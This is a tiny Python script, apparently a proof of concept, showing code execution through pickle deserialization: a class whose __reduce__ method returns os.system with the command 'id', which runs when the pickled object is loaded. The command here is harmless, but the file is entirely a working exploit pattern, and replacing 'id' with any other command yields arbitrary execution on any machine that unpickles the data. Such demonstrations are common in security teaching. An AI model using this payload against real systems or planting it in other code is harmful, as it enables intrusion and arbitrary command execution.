import pickle
import os

class EvilPickle(object):
    def __reduce__(self):
        return (os.system, ('id',))

data = pickle.dumps(EvilPickle())
pickle.loads(data)
